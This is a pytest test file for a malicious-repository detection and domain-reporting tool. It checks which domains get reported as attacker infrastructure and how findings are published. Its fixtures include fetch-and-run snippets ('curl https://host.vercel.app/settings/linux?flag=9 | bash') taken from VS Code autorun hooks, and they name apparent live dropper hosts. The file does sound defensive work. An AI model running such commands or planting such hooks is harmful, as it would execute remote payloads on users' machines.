"""A domain report must only ever name attacker infrastructure.

Run #88 queued api.telegram.org as a malicious-domain report. That is Telegram's
own bot API. Submitting it would ask OSM to blocklist a service that millions of
legitimate bots use, and the same reasoning covers Discord, Slack, GitHub and the
URL shorteners already guarded.
"""

from __future__ import annotations

import pytest

from git_warden.osm_submit import (
    _is_shared_service,
    _is_shortener,
    _reportable_domain,
    domain_reports_for,
)


@pytest.mark.parametrize("host", [
    "api.telegram.org", "discord.com", "discordapp.com", "hooks.slack.com",
    "raw.githubusercontent.com", "github.com", "pastebin.com", "webhook.site",
    "WWW.Discord.com", "api.telegram.org.",
])
def test_shared_services_are_never_reportable(host):
    assert _is_shared_service(host)
    assert not _reportable_domain(host)


@pytest.mark.parametrize("host", [
    "default-configuration.vercel.app",        # the live dropper host
    "default-configuration-sandy.vercel.app",
    "vscode-config-setting.vercel.app",
    "evil-c2.example.com",
    "45.61.130.12",
])
def test_attacker_infrastructure_stays_reportable(host):
    assert _reportable_domain(host), "real C2 must still be submittable"


def test_platform_subdomain_is_not_excluded_by_its_parent():
    # vercel.app is a service, but an attacker-controlled subdomain of it is
    # infrastructure. Suffix matching here would silence the whole campaign.
    assert _reportable_domain("default-configuration.vercel.app")
    assert not _is_shared_service("default-configuration.vercel.app")


def test_shorteners_remain_excluded():
    assert _is_shortener("pesncv.short.gy")
    assert not _reportable_domain("pesncv.short.gy")


class _Assessment:
    tags = ["dprk"]

    def __init__(self, c2):
        self.c2 = list(c2)


def test_domain_reports_drop_services_and_keep_c2():
    row = {"full_name": "attacker/lure"}
    reports = domain_reports_for(
        row, _Assessment(["default-configuration.vercel.app", "api.telegram.org"])
    )
    named = [r["resource_identifier"] for r in reports]
    assert named == ["default-configuration.vercel.app"]


def test_domain_reports_can_be_empty():
    row = {"full_name": "attacker/lure"}
    assert domain_reports_for(row, _Assessment(["api.telegram.org"])) == []


def test_review_tier_never_reaches_the_public_wall(tmp_path):
    """The Wall of Shame is a public accusation, so REVIEW must not appear on it.

    The 2026-07-21 run published photoprism/photoprism and mlflow/mlflow as
    confirmed malware on the strength of one administrative credential read.
    """
    import json

    from git_warden.db import Database

    db = Database.open(tmp_path / "t.sqlite")
    for name, conf in (("attacker/dropper", "auto"),
                       ("photoprism/photoprism", "review"),
                       ("legacy/capture", None)):
        payload = {"confidence": conf} if conf else {}
        db.conn.execute(
            "INSERT INTO repo_findings (full_name, url, detection_method, status, "
            "score, raw_payload) VALUES (?,?,?,?,?,?)",
            (name, f"https://github.com/{name}", "signature_match", "confirmed",
             10, json.dumps(payload)),
        )
    db.conn.commit()
    published = {r["full_name"] for r in db.published_findings()}
    assert "attacker/dropper" in published
    assert "legacy/capture" in published, "pre-tiering captures are kept"
    assert "photoprism/photoprism" not in published, "REVIEW must never be published"
    db.close()


def test_truncated_host_is_merged_not_reported():
    from git_warden.osm_submit import _merge_truncated_hosts
    # A snippet cut mid-domain leaves 'vscode-production-setting.ve'; it must fold
    # into the full host, not become its own (invalid) domain report.
    hr = {
        "vscode-production-setting.ve": {"a/1"},
        "vscode-production-setting.vercel.app": {"b/2", "c/3"},
        "default-configuration.vercel.app": {"d/4"},
    }
    merged = _merge_truncated_hosts(hr)
    assert "vscode-production-setting.ve" not in merged
    assert merged["vscode-production-setting.vercel.app"] == {"a/1", "b/2", "c/3"}
    assert merged["default-configuration.vercel.app"] == {"d/4"}  # untouched


def test_distinct_domains_are_not_merged():
    from git_warden.osm_submit import _merge_truncated_hosts
    # A real host and a subdomain are not prefixes of each other; both survive.
    hr = {"example.com": {"a/1"}, "api.example.com": {"b/2"}}
    merged = _merge_truncated_hosts(hr)
    assert set(merged) == {"example.com", "api.example.com"}


def test_campaign_context_reports_cluster_and_rotation(tmp_path):
    import json as _json

    from git_warden.db import Database
    from git_warden.osm_submit import campaign_context
    db = Database.open(tmp_path / "t.sqlite")

    def add(name, host):
        payload = {"confidence": "auto", "bash_findings": [
            {"file": ".vscode/tasks.json", "line": 0, "category": "install_hook",
             "rule": "vscode-autorun",
             "snippet": f"curl https://{host}/settings/linux?flag=9 | bash"}]}
        db.conn.execute(
            "INSERT INTO repo_findings (full_name, url, detection_method, status, "
            "score, raw_payload) VALUES (?,?,?,?,?,?)",
            (name, f"https://github.com/{name}", "signature_match", "confirmed", 5,
             _json.dumps(payload)))

    add("a/one", "host1.vercel.app")
    add("b/two", "host2.vercel.app")
    add("c/three", "host3.vercel.app")
    db.conn.commit()
    row = db.conn.execute("SELECT * FROM repo_findings WHERE full_name='a/one'").fetchone()
    ctx = campaign_context(db, row)
    assert "one of 3" in ctx                       # 3 repos in the cluster
    assert "3 distinct hosts" in ctx               # rotation breadth
    assert "settings/linux?flag=" in ctx           # shared path fingerprint
    assert "--" not in ctx and "—" not in ctx  # no dashes
    db.close()


def test_campaign_context_empty_for_a_lone_repo(tmp_path):
    import json as _json

    from git_warden.db import Database
    from git_warden.osm_submit import campaign_context
    db = Database.open(tmp_path / "t.sqlite")
    payload = {"confidence": "auto", "bash_findings": [
        {"file": "x", "line": 0, "category": "install_hook", "rule": "vscode-autorun",
         "snippet": "curl https://only.vercel.app/settings/linux?flag=9 | bash"}]}
    db.conn.execute(
        "INSERT INTO repo_findings (full_name, url, detection_method, status, score, raw_payload)"
        " VALUES (?,?,?,?,?,?)",
        ("solo/repo", "https://github.com/solo/repo", "signature_match", "confirmed", 5,
         _json.dumps(payload)))
    db.conn.commit()
    row = db.conn.execute("SELECT * FROM repo_findings WHERE full_name='solo/repo'").fetchone()
    assert campaign_context(db, row) == ""  # no cluster, no sentence
    db.close()
